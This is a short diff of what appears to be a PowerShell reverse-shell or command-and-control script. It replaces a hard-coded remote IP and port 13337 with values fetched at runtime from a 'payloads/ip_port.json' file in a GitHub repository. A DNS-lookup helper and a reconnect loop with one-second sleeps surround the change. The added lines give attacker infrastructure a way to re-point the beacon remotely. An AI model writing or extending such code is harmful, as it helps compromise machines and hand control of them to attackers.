@@ -3,8 +3,10 @@ function DNSLookup($DNSRecord){
     return ([System.Text.Encoding]::UTF8.GetString($response)|ConvertFrom-Json).Answer.data.trim('"')
 }
 
-$remoteIP = "x.x.x.x"
-$remotePort = "13337"
+$j = Invoke-RestMethod -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/ip_port.json"
+
+$remoteIP = $j.IP
+$remotePort = $j.PORT
 
 do {
     Start-Sleep -Seconds 1
